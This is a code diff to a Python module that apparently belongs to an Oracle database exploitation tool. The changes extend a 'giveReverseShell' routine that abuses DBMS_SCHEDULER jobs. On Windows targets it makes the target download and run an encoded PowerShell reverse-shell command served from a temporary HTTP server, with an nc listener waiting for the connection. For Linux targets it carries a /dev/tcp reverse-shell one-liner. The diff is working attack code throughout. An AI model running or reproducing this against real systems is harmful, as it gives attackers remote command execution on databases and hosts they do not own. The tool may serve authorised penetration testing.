@@ -8,6 +8,7 @@ from Constants import *
 from time import sleep
 from threading import Thread
 import base64
+from MinHtppServer import serverFileForOneRequest
 
 class DbmsScheduler (OracleDatabase):
 	'''
@@ -156,17 +157,41 @@ class DbmsScheduler (OracleDatabase):
 		nc listen on the port
 		'''
 		try :
-			subprocess.call("nc -l -v -p {0}".format(port), shell=True)
+			subprocess.call("nc -l -4 -n -v -p {0}".format(port), shell=True)
 		except KeyboardInterrupt: pass
 
-	def giveReverseShell(self, localip, localport):
+	def giveReverseShell(self, localip, localport, httpServerTimeout=15, targetFilename="t.cmd"):
 		'''
 		Give a reverse tcp shell via nc
 		Need upload nc.exe if the remote system is windows
+		- httpServerTimeout: time before to close the connection (Windows Only)
+		- targetFilename: path to the file on the target (Windows Only)
 		'''
 		if self.remoteSystemIsWindows() == True :
+			CMD_EXEC_FILE = ".\{0}"
+			httpPort = None
 			CMD = self.getReverseShellPowershellCommand(localip, localport)
 			logging.debug('The following command will be executed on the target: {0}'.format(CMD))
+			httpPort = int(input("Give me the local port for the temporary http file server {e.g. 8080): "))
+			logging.debug("The http server will listen on {0}:{1} during {2} seconds".format(localip, httpPort, httpServerTimeout))
+			tHttpServer = Thread(None, serverFileForOneRequest, None, (), {'ip':localip, 'port':httpPort, 'content':CMD.encode('utf-8'), 'timeout':httpServerTimeout})
+			tHttpServer.start()
+			logging.debug("Http Server started in a new thread")
+			urlToDownload = "http://{0}:{1}/{2}".format(localip, httpPort, self.__generateRandomString__(nb=10))
+			logging.debug("URL used to make the target download the file {0}: {1}".format(targetFilename, urlToDownload))
+			status = self.makeDownloadFile(urlToDownload, targetFilename)
+			logging.debug("Starting the local listener in a new thread")
+			a = Thread(None, self.__runListenNC__, None, (), {'port': localport})
+			a.start()
+			try:
+				self.execOSCommand(cmd=CMD_EXEC_FILE.format(targetFilename), prepandWindCmdPath=True)
+			except KeyboardInterrupt:
+				self.args['print'].goodNews("Connection closed")
+			status = self.__getJobStatus__()
+			self.__removeJob__(self.jobName, force=False, defer=True)
+			
+
+			"""
 			self.args['print'].goodNews("The powershell reverse shell tries to connect to {0}:{1}".format(localip, localport))
 			a = Thread(None, self.__runListenNC__, None, (), {'port': localport})
 			a.start()
@@ -176,6 +201,7 @@ class DbmsScheduler (OracleDatabase):
 				self.args['print'].goodNews("Connection closed")
 			self.__getJobStatus__()
 			self.__removeJob__(self.jobName, force=False, defer=True)
+			"""
 		elif self.remoteSystemIsLinux() == True :
 			#PYTHON_CODE = """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);""".format(localip, localport)
 			PYTHON_CODE = """import os; os.system('exec 5<>/dev/tcp/{0}/{1}; /bin/cat <&5 | while read line; do $line 2>&5 >&5; done');""".format(localip, localport)
@@ -195,25 +221,31 @@ class DbmsScheduler (OracleDatabase):
 
 	def getReverseShellPowershellCommand(self, localip, localport):
 		'''
-		Return powershell reverse shell complete command (obfuscated)
+		Return a powershell reverse shell complete command (obfuscated)
+		The powershell command will connect to localip:localport
+		A listener is required for getting the reverse shell
 		:return: string (to execute)
 		'''
-		cmdAndPayload = self.R_SHELL_COMMAND_POWERSHELL.format(base64.b64encode("".join([c + '\x00' for c in self.R_SHELL_COMMAND_POWERSHELL_PAYLOAD.format(localip, localport)]).encode('utf-8')))
+		ps_code = self.R_SHELL_COMMAND_POWERSHELL_PAYLOAD.format(localip, localport).encode('UTF-16LE')
+		ps_code_encoded = base64.b64encode(ps_code).decode('utf-8')
+		cmdAndPayload = "{0} -EncodedCommand {1}".format(self.PS_X64_PATH, ps_code_encoded)
+		#cmdAndPayload = self.R_SHELL_COMMAND_POWERSHELL.format(base64.b64encode("".join([c + '\x00' for c in self.R_SHELL_COMMAND_POWERSHELL_PAYLOAD.format(localip, localport)]).encode('utf-8')))
 		return cmdAndPayload
 
 	def makeDownloadFile(self, urlToFile, remoteFilePath):
 		'''
 		Make the target download local file localFilePath to remoteFilePath
 		:param localFile:
-		:return:
+		:return: status of the job (True or False if an error)
 		'''
 		PS_CODE_DOWNLOAD = """$c=new-object System.Net.WebClient;$c.DownloadFile("{0}", "{1}")"""#{0}urlToFile, {1}urlToFile
 		ps_code = PS_CODE_DOWNLOAD.format(urlToFile, remoteFilePath).encode('UTF-16LE')
 		ps_code_encoded = base64.b64encode(ps_code).decode('utf-8')
 		cmdAndPayload = "{0} -EncodedCommand {1}".format(self.PS_X64_PATH, ps_code_encoded)
 		self.execOSCommand(cmd=cmdAndPayload)
-		self.__getJobStatus__()
+		status = self.__getJobStatus__()
 		self.__removeJob__(self.jobName, force=False, defer=True)
+		return status
 
 	def testAll (self):
 		'''
